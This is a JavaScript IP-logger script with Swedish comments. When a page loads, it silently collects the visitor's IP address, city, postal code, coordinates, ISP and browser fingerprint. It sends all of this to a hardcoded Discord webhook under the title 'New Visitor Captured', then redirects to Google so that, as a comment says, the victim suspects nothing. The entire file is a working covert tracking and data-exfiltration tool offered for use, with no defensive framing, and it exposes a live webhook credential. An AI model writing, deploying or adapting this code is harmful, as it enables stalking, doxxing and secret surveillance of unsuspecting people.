(function() {
    'use strict';
    
    // ============================================
    // SÄTT IN DIN DISCORD WEBHOOK HÄR
    // GRATIS: gå till Discord serverinställningar -> Integrationer -> Webhooks
    // ============================================
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1486791223199928600/WdFIJEPc91Opodm0hHCsGQjgwawUFUx8kOzYYyMH1bfaEAnj264TVURXGj1RKXBUrLv7';
    
    // ============================================
    // HÄMTA IP (GRATIS API)
    // ============================================
    async function getIP() {
        // Gratis IP-API, inget konto krävs
        const apis = [
            'https://api.ipify.org?format=json',
            'https://api.my-ip.io/ip.json',
            'https://ipapi.co/json/'
        ];
        
        for (const api of apis) {
            try {
                const response = await fetch(api);
                const data = await response.json();
                
                if (api.includes('ipify')) return { ip: data.ip };
                if (api.includes('my-ip')) return { ip: data.ip };
                if (api.includes('ipapi')) {
                    return {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        postal: data.postal,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        isp: data.org,
                        timezone: data.timezone
                    };
                }
            } catch(e) {}
        }
        return { ip: 'unable to fetch' };
    }
    
    // ============================================
    // HÄMTA EXTRA DATA (GRATIS)
    // ============================================
    function getBrowserData() {
        const screen = window.screen;
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenSize: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'Direct',
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
    }
    
    // ============================================
    // SKICKA TILL DISCORD (GRATIS)
    // ============================================
    async function sendToDiscord() {
        try {
            const ipData = await getIP();
            const browserData = getBrowserData();
            
            // Bygg meddelandet
            const embed = {
                title: '🎯 New Visitor Captured',
                color: 0x00ff00,
                fields: [
                    {
                        name: '🌐 IP Address',
                        value: `\`${ipData.ip}\``,
                        inline: true
                    },
                    {
                        name: '📍 Location',
                        value: ipData.city ? `${ipData.city}, ${ipData.country}` : 'Fetching...',
                        inline: true
                    },
                    {
                        name: '🖥️ Device',
                        value: browserData.userAgent.substring(0, 80),
                        inline: false
                    },
                    {
                        name: '🔧 Details',
                        value: `**OS:** ${browserData.platform}\n**Language:** ${browserData.language}\n**Screen:** ${browserData.screenSize}\n**Timezone:** ${browserData.timezone}`,
                        inline: true
                    },
                    {
                        name: '📎 Source',
                        value: `**Referrer:** ${browserData.referrer}\n**Time:** ${browserData.timestamp}`,
                        inline: true
                    }
                ],
                footer: {
                    text: `IP Logger • ${new Date().toLocaleString()}`
                }
            };
            
            // Lägg till mer info om ipapi gav extra data
            if (ipData.isp) {
                embed.fields.push({
                    name: '🏢 ISP',
                    value: ipData.isp,
                    inline: true
                });
            }
            
            if (ipData.latitude) {
                embed.fields.push({
                    name: '🗺️ Coordinates',
                    value: `${ipData.latitude}, ${ipData.longitude}`,
                    inline: true
                });
            }
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
            
        } catch(e) {
            // Tyst fail
        }
    }
    
    // ============================================
    // OMDIRIGERING (VALFRITT)
    // ============================================
    function redirect() {
        // Omdirigera till en vanlig sida så offret inte misstänker något
        window.location.href = 'https://www.google.com';
    }
    
    // ============================================
    // KÖR ALLT
    // ============================================
    sendToDiscord().then(() => {
        // Vänta 2 sekunder och omdirigera
        setTimeout(redirect, 2000);
    });
    
})();